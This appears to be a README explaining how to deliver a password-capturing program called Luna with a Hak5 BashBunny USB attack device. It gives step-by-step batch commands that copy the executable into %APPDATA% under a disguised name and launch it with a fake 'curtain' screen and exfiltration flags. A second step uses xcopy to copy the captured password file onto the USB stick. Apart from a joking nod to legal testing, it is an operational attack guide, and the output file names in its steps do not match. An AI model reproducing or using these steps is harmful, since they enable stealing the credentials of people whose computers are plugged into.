The BashBunny by Hak5 (https://hakshop.com/products/bash-bunny) is an excellent delivery system for Luna:
1) Set one switch to start Luna (use the ExecutableInstaller script)
2) Set the other switch to remove Luna and get the password (use the usbExfiltrate script)

Steps
-----
1. Copy luna.exe to the root of the BashBunny
2. Place all the files from ExecutableInstaller in switch1
   a) Files found at https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/ExecutableInstaller
   b) If you have changed your BashBunny name, change it in the payload.txt
3. Edit e.cmd and change as follows:
   a) where it says copy payload, use this line below (change the runme.exe to a random name)

      copy %~dp0\..\..\luna.exe %APPDATA%\runme.exe

   b) Then where executing a payload use the following line:

      start "" "%APPDATA%\runme.exe" /curtain 2 /exfil 1 /output %APPDATA%\word.txt

      * You can change to an encrypted exfiltration if you would like

4. Save the command and test out to verify the curtain starts.
5. Place all the files from usbExfiltration in switch2
   a) File are at https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/usb_exfiltrator
   b) If you have changed your BashBunny name, change it in the payload.txt
6. In the xcopy section add the line:
   xcopy /C /Q /G /Y /S %APPDATA%\positive.txt %dst% >>nul
7. Save and verify

Notes
-----
1. Hak5 recommends to edit on a PC and then copy to the BashBunny. I forget this all the time. Just make sure you make a backup copy.
2. The exfiltration can trick you in thinking it's done before it really is. To ensure the copying is complete, dismount the USB.
3. I've found in testing that luna will not always come to forefront. Just click it on the start bar if it doesn't.
4. You may choose to delete Luna on exfiltration. Since you are testing legally though I'm sure that's not an issue, right?
